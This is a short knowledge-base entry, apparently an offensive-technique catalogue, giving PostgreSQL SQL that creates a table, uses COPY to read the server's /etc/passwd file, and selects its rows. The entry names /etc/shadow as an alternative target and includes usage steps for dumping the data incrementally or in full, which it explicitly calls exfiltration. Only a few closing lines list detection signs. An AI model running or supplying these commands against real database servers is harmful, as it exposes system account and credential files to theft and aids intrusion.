---
type: code
language: sql
verified: true
platforms:
  - PostgreSQL
tags:
  - file-import
  - passwd-exfil
validated: true
---

# postgresql-import-etc-passwd-via-copy

## Code

```sql
CREATE TABLE temp(t TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp limit 1 offset 0;
```

## Description

This SQL code creates a temp table, imports /etc/passwd using COPY, and selects the first row to verify and begin exfiltrating user account data.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| temp | Temp table name | temp_users |
| t TEXT | Column type | line TEXT |
| '/etc/passwd' | File path | '/etc/shadow' |
| limit 1 offset 0 | Query limit | LIMIT 10 |

## Usage

Run sequentially in a database session with superuser rights. Use the SELECT to dump data incrementally; extend with full SELECT * FROM temp; for complete exfil.

## Detection

- Monitoring for CREATE TEMP TABLE followed by COPY FROM system files.
- Query logs showing /etc/passwd access.
- Temp table creation spikes.

## Related

- [[procedures/Read-Files-via-PostgreSQL-Server-Functions]]
